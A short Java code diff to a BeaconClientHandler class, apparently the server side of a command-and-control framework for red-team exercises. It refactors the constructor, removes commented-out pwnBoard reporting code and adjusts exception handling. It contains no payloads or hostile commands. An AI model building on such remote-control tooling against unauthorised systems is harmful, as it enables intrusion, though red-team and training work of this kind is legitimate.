@@ -41,7 +41,7 @@ public class BeaconClientHandler implements Runnable{
      * @param beaconServer Pointer to the Becon Server that this client is associated with
      * @param os Operating System of this client
      */
-    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String OS, Object shellLock, aes aes){
+    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String OS, aes aes){
         this.IPAddress = IPAddress;
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
@@ -115,10 +115,6 @@ public class BeaconClientHandler implements Runnable{
         // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
         keepAliveThread.start();
 
-        // Create a new thread responsible for updating pwnBoard
-        // Thread pwnBoardRequestThread = new Thread(pwnBoardRequestObject);
-        // pwnBoardRequestThread.start();
-
         String encrypted = "";
         String response = "";
         while(sentinel){ 
@@ -144,12 +140,12 @@ public class BeaconClientHandler implements Runnable{
                 }
             } catch(java.net.SocketException e){
                 clientDisconnect(e);
-            } 
-            
-            catch (IOException e){
+            } catch (IOException e){
                 clientDisconnect(e);
             } catch (java.lang.NullPointerException e){
                 clientDisconnect(e);
+            } catch (Exception e) {
+                e.printStackTrace();
             }
         }
     }
